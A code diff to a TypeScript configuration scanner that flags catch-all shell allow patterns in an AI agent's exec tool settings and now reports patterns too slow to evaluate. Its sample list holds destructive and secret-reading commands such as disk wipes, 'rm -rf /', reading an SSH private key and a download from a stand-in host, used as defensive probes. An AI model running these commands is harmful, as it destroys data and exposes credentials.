@@ -1,6 +1,6 @@
 import type { Evidence } from '../../core/types.js';
 import { defineCheck } from '../../core/check-builder.js';
-import { unsafeRegexReason } from '../../rules/regex-safety.js';
+import { testSamples } from '../../analyzers/bounded-regex.js';
 import { asRecord, asStringArray, getPath, nanobotConfigs, pick, pyBool } from './shared.js';
 
 // allowPatterns are re.fullmatch()ed against each shell segment and take
@@ -8,17 +8,19 @@ import { asRecord, asStringArray, getPath, nanobotConfigs, pick, pyBool } from '
 // mkfs, dd if=, shutdown, fork bomb, …) — so a catch-all disables it. Any
 // regex spelling can be a catch-all ((?i).*, .{0,}, (.|\n)*, [^\x00]*), so
 // patterns are judged by what they match, not by their text.
+// shortest first: a pattern that misses one is told apart early (testSamples)
 const DANGEROUS_SAMPLES = [
   'rm -rf /',
-  'dd if=/dev/zero of=/dev/sda',
-  'mkfs.ext4 /dev/sda1',
   'shutdown -h now',
-  'curl http://x.example/a.sh -o /tmp/a.sh',
   'cat ~/.ssh/id_rsa',
+  'mkfs.ext4 /dev/sda1',
+  'dd if=/dev/zero of=/dev/sda',
+  'curl http://x.example/a.sh -o /tmp/a.sh',
 ];
 
 /** Compile a Python `re` pattern for fullmatch semantics; leading inline
- *  flag groups ((?i), (?s), (?is)…) become RegExp flags. */
+ *  flag groups ((?i), (?s), (?is)…) become RegExp flags. The pattern comes
+ *  from config: run it with `testSamples`, never `re.test`. */
 export function compilePyFullmatch(pattern: string): RegExp | undefined {
   let src = pattern;
   let flags = '';
@@ -27,18 +29,28 @@ export function compilePyFullmatch(pattern: string): RegExp | undefined {
     src = src.slice(m[0].length);
   }
   try {
-    const re = new RegExp(`^(?:${src})$`, flags);
-    // a pattern that backtracks super-linearly is not run (it comes from config)
-    return unsafeRegexReason(re.source) ? undefined : re;
+    return new RegExp(`^(?:${src})$`, flags);
   } catch {
     return undefined;
   }
 }
 
+/**
+ * `catch-all` for an allow pattern that fullmatches every sample dangerous
+ * command, `not-evaluated` for one that couldn't be run on the samples in
+ * time (it backtracks exponentially), undefined otherwise.
+ */
+export function judgeAllowPattern(pattern: string): 'catch-all' | 'not-evaluated' | undefined {
+  const re = compilePyFullmatch(pattern.trim());
+  if (!re) return undefined;
+  const hits = testSamples(re, DANGEROUS_SAMPLES, { untilMiss: true });
+  if (!hits) return 'not-evaluated';
+  return hits.every(Boolean) ? 'catch-all' : undefined;
+}
+
 /** An allow pattern that fullmatches every sample dangerous command. */
 export function isCatchAllPattern(pattern: string): boolean {
-  const re = compilePyFullmatch(pattern.trim());
-  return !!re && DANGEROUS_SAMPLES.every(cmd => re.test(cmd));
+  return judgeAllowPattern(pattern) === 'catch-all';
 }
 
 const SANDBOXES = new Set(['bwrap', 'seatbelt']);
@@ -67,7 +79,16 @@ export const nb004 = defineCheck({
       if (pyBool(exec?.enable) === false) continue;
 
       for (const pattern of asStringArray(pick(exec, 'allowPatterns'))) {
-        if (!isCatchAllPattern(pattern)) continue;
+        const verdict = judgeAllowPattern(pattern);
+        if (verdict === 'not-evaluated') {
+          evidence.push({
+            file: config.filePath,
+            snippet: `tools.exec.allowPatterns: ${JSON.stringify(pattern)}`,
+            detail: 'Allow pattern not evaluated: it backtracks exponentially on sample commands, so whether it exempts dangerous commands from the deny list is unknown — review it',
+          });
+          continue;
+        }
+        if (verdict !== 'catch-all') continue;
         critical = true;
         evidence.push({
           file: config.filePath,
